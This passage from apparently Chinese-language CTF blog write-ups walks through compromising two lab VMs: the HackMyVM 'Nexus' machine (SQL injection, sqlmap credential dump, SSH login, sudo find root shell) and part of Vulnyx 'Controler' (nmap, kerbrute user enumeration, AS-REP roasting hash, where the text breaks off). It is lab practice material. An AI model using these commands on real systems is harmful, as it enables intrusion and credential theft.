(@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.118:80<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,zip,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 825]<br>/.php                 (Status: 403) [Size: 279]<br>/login.php            (Status: 200) [Size: 352]<br>/index2.php           (Status: 200) [Size: 75134]<br>/.html                (Status: 403) [Size: 279]<br>/.php                 (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102795 / 1102800 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>访问login.php和index.html都没东西，访问index2.php.</p><p>好炫酷的界面。。。。</p><p>乱点一通之后得到一个信息，提示我们访问auth-login.php。</p><p><img src="/2025/06/12/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png"></p><h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr><p>访问之后是个登录界面，抓包看一下登录参数，试用常用轻型字典爆破无果。</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_cYvLnbBM6W.png"></p><p>密码加个单引号，发现sql报错。</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_8mQiP65Dni.png"></p><p>直接丢给sqlmap。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;1.txt</span><br>POST /login.php HTTP/1.1<br>Host: 192.168.56.118<br>Content-Length: 18<br>Cache-Control: max-age=0<br>Accept-Language: en-US,en;q=0.9<br>Origin: http://192.168.56.118<br>Content-Type: application/x-www-form-urlencoded<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://192.168.56.118/auth-login.php<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>user=admin&amp;pass=1&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sqlmap -l 1.txt --batch --dbs<br>.......<br>[23:18:46] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Debian<br>web application technology: Apache 2.4.62<br>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)<br>[23:18:46] [INFO] fetching database names<br>[23:18:46] [INFO] retrieved: &#x27;information_schema&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;sion&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;mysql&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;performance_schema&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;Nebuchadnezzar&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;sys&#x27;<br>available databases [6]:<br>[*] information_schema<br>[*] mysql<br>[*] Nebuchadnezzar<br>[*] performance_schema<br>[*] sion<br>[*] sys<br>[23:18:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/root/.local/share/sqlmap/output/results-06112025_1118pm.csv&#x27;                                                                                                                                                 <br>[23:18:46] [WARNING] your sqlmap version is outdated<br><br>sqlmap -l 1.txt --batch -D Nebuchadnezzar --tables<br>......<br>[23:21:36] [INFO] fetching tables for database: &#x27;Nebuchadnezzar&#x27;<br>[23:21:36] [INFO] retrieved: &#x27;users&#x27;<br>Database: Nebuchadnezzar<br>[1 table]<br>+-------+<br>| users |<br>+-------+<br><br>sqlmap -l 1.txt --batch -D Nebuchadnezzar -T users --dump<br>.......<br>[23:22:13] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Debian<br>web application technology: Apache 2.4.62<br>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)<br>[23:22:13] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;Nebuchadnezzar&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;id&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;int(11)&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;username&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;varchar(50)&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;password&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;varchar(255)&#x27;<br>[23:22:13] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;Nebuchadnezzar&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;1&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;F4ckTh3F4k3H4ck3r5&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;shelly&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;2&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;cambiame2025&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;admin&#x27;<br>Database: Nebuchadnezzar<br>Table: users<br>[2 entries]<br>+----+--------------------+----------+<br>| id | password           | username |<br>+----+--------------------+----------+<br>| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |<br>| 2  | cambiame2025       | admin    |<br>+----+--------------------+----------+<br></code></pre></td></tr></table></figure><p>得到账号和密码，之前的web端登上去没东西，试试ssh可以连上去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh shelly@192.168.56.118                                <br>The authenticity of host &#x27;192.168.56.118 (192.168.56.118)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:r1lUfXxL8Fd1e/Q87Jno3P3xHjMTUwmJlKfcsl0AST8.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.118&#x27; (ED25519) to the list of known hosts.<br>**************************************************************<br>HackMyVM System                                              *<br>                                                             *<br>   *  .  . *       *    .        .        .   *    ..        *<br> .    *        .   ###     .      .        .            *    *<br>    *.   *        #####   .     *      *        *    .       *<br>  ____       *  ######### *    .  *      .        .  *   .   *<br> /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *<br>/___/  ^8/      ###\|/###  *    *            .      *   *    *<br>|   ||%%(        # &#125;|&#123;  #                                    *<br>|___|,  \\         &#125;|&#123;                                       *<br>                                                             *<br>                                                             *<br>Wellcome to Nexus Vault.                                     *<br>**************************************************************<br>shelly@192.168.56.118&#x27;s password: <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#####################</span></span><br>DONT TOUCH MY SYSTEM #<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#####################</span></span><br>Last login: Thu May  8 22:44:41 2025 from 192.168.1.10<br>shelly@NexusLabCTF:~$<br></code></pre></td></tr></table></figure><p>拿到userflag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">shelly@NexusLabCTF:~$ ls<br>SA<br>shelly@NexusLabCTF:~$ ls -sa<br>total 28<br>4 .  4 ..  4 .bash_logout  4 .bashrc  4 .local  4 .profile  4 SA<br>shelly@NexusLabCTF:~$ cd SA<br>shelly@NexusLabCTF:~/SA$ ls<br>user-flag.txt<br>shelly@NexusLabCTF:~/SA$ cat user-flag.txt <br><br>   ▄█    █▄      ▄▄▄▄███▄▄▄▄    ▄█    █▄  <br>  ███    ███   ▄██▀▀▀███▀▀▀██▄ ███    ███ <br>  ███    ███   ███   ███   ███ ███    ███ <br> ▄███▄▄▄▄███▄▄ ███   ███   ███ ███    ███ <br>▀▀███▀▀▀▀███▀  ███   ███   ███ ███    ███ <br>  ███    ███   ███   ███   ███ ███    ███ <br>  ███    ███   ███   ███   ███ ███    ███ <br>  ███    █▀     ▀█   ███   █▀   ▀██████▀  <br>                                        <br>HackMyVM<br>Flag User ::  82kd8FJ5SJ00HMVUS3R36gd<br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>sudo-l查看可用命令，发现find。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">shelly@NexusLabCTF:~/SA$ sudo -l<br>sudo: unable to resolve host NexusLabCTF: Fallo temporal en la resolución del nombre<br>Matching Defaults entries for shelly on NexusLabCTF:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty<br><br>User shelly may run the following commands on NexusLabCTF:<br>    (ALL) NOPASSWD: /usr/bin/find<br><br></code></pre></td></tr></table></figure><p>那直接find提权秒了。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shelly<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:~/SA</span><span class="hljs-variable">$ </span>sudo /usr/bin/find / -exec /bin/bash \;<br><span class="hljs-symbol">sudo:</span> unable to resolve host <span class="hljs-symbol">NexusLabCTF:</span> <span class="hljs-title class_">Fallo</span> temporal en la resolución del nombre<br>root<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:/home/shelly/SA</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>只是它的rootflag藏在图片里，转成base64复制过来解码也行，直接从靶机下下来010或者啥隐写工具也行。</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_YOFEbnNlEY.png"></p><p>不过最简单粗暴的方法就是直接cat，因为它直接把flag放在末尾了。</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_o7GAUboN0z.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnyx-Controler</title>
    <link href="/2025/06/11/Vulnyx-Controler/"/>
    <url>/2025/06/11/Vulnyx-Controler/</url>
    
    <content type="html"><![CDATA[<p>windows靶机。</p><p>靶机IP：192.168.56.117</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>nmap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.117    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:32 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating ARP Ping Scan at 04:32<br>Scanning 192.168.56.117 [1 port]<br>Completed ARP Ping Scan at 04:32, 0.04s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 04:32<br>Completed Parallel DNS resolution of 1 host. at 04:32, 0.04s elapsed<br>Initiating SYN Stealth Scan at 04:32<br>Scanning 192.168.56.117 [1000 ports]<br>Discovered open port 445/tcp on 192.168.56.117<br>Discovered open port 135/tcp on 192.168.56.117<br>Discovered open port 53/tcp on 192.168.56.117<br>Discovered open port 139/tcp on 192.168.56.117<br>Discovered open port 88/tcp on 192.168.56.117<br>Discovered open port 464/tcp on 192.168.56.117<br>Discovered open port 3269/tcp on 192.168.56.117<br>Discovered open port 3268/tcp on 192.168.56.117<br>Discovered open port 636/tcp on 192.168.56.117<br>Discovered open port 389/tcp on 192.168.56.117<br>Discovered open port 593/tcp on 192.168.56.117<br>Completed SYN Stealth Scan at 04:32, 1.46s elapsed (1000 total ports)<br>Initiating Service scan at 04:32<br>Scanning 11 services on 192.168.56.117<br>Completed Service scan at 04:32, 6.22s elapsed (11 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.117<br>NSE: Script scanning 192.168.56.117.<br>Initiating NSE at 04:32<br>Completed NSE at 04:33, 8.34s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.09s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00053s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-11 23:32:51Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Microsoft Windows 2019<br>OS details: Microsoft Windows Server 2019<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=262 (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: Host: CONTROLER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: 2025-06-11T23:32:52<br>|_  start_date: N/A<br>| nbstat: NetBIOS name: CONTROLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ac:90:5a (Oracle VirtualBox virtual NIC)<br>| Names:<br>|   CONTROLER&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|   CONTROL&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROL&lt;1c&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROLER&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|_  CONTROL&lt;1b&gt;          Flags: &lt;unique&gt;&lt;active&gt;<br>|_clock-skew: 14h59m57s<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.53 ms 192.168.56.117<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds<br>           Raw packets sent: 1148 (51.210KB) | Rcvd: 1017 (41.350KB)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.117 --script vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:35 EDT<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00040s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>53/tcp   open  domain<br>88/tcp   open  kerberos-sec<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>389/tcp  open  ldap<br>445/tcp  open  microsoft-ds<br>464/tcp  open  kpasswd5<br>593/tcp  open  http-rpc-epmap<br>636/tcp  open  ldapssl<br>3268/tcp open  globalcatLDAP<br>3269/tcp open  globalcatLDAPssl<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br>|_smb-vuln-ms10-054: false<br>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br><br>Nmap done: 1 IP address (1 host up) scanned in 41.07 seconds<br></code></pre></td></tr></table></figure><p>smb登录看一看有什么东西。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nxc smb 192.168.56.117                                        <br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br></code></pre></td></tr></table></figure><p>拿到了一个域名，放到hosts里。</p><p>尝试进行用户收集。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldapsearch -x -H ldap://192.168.56.117<br><span class="hljs-meta prompt_"># </span><span class="language-bash">extended LDIF</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># LDAPv3</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">base &lt;&gt; (default) with scope subtree</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">filter: (objectclass=*)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">requesting: ALL</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"></span><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">search result</span><br>search: 2<br>result: 1 Operations error<br>text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera<br> tion a successful bind must be completed on the connection., data 0, v4563<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">numResponses: 1</span><br>                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# rpcclient -U &quot;&quot; -N 192.168.56.117<br>rpcclient $&gt; netshareenum<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; netshareenumall<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; ^C<br>                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# enum4linux -A 192.168.56.117<br>Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 11 04:50:21 2025<br><br> =========================================( Target Information )=========================================<br>                                                                                                                                                           <br>Target ........... 192.168.56.117                                                                                                                          <br>RID Range ........ 500-550,1000-1050<br>Username ......... &#x27;&#x27;<br>Password ......... &#x27;&#x27;<br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br><br><br> ===========================( Enumerating Workgroup/Domain on 192.168.56.117 )===========================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Got domain/workgroup name: CONTROL                                                                                                                     <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ==================================( Session Check on 192.168.56.117 )==================================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Server 192.168.56.117 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                                                   <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ===============================( Getting domain SID for 192.168.56.117 )===============================<br>                                                                                                                                                           <br>Domain Name: CONTROL                                                                                                                                       <br>Domain Sid: S-1-5-21-2142633474-2248127568-3584646925<br><br>[+] Host is part of a domain (not a workgroup)                                                                                                             <br>                                                                                                                                                           <br>enum4linux complete on Wed Jun 11 04:50:21 2025                <br></code></pre></td></tr></table></figure><p>无果，尝试暴力破解。</p><p>（这里用kali自带的用户名字典跑不出来，得换网上专门用于用户枚举的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.56.117 /usr/share/seclists/Usernames/A-Z.Surnames.txt                 <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 06/11/25 - Ronnie Flathers @ropnop<br><br>2025/06/11 05:05:02 &gt;  Using KDC(s):<br>2025/06/11 05:05:02 &gt;   192.168.56.117:88<br><br>2025/06/11 05:05:02 &gt;  [+] VALID USERNAME:       B.LEWIS@control.nyx<br>2025/06/11 05:05:08 &gt;  Done! Tested 13000 usernames (1 valid) in 6.136 seconds<br><br></code></pre></td></tr></table></figure><p>得到一个域用户。</p><h3 id="AS-Roasting"><a href="#AS-Roasting" class="headerlink" title="AS-Roasting"></a>AS-Roasting</h3><hr><p>查看该域用户是否无域认证，尝试抓取hash。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-GetNPUsers control.nyx/B.LEWIS -no-pass <br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Getting TGT for B.LEWIS<br>/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).<br>  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">krb5asrep$23<span class="hljs-variable">$B</span>.LEWIS@CONTROL.NYX:673f87866e1253733a78d827c8f76ac2<span 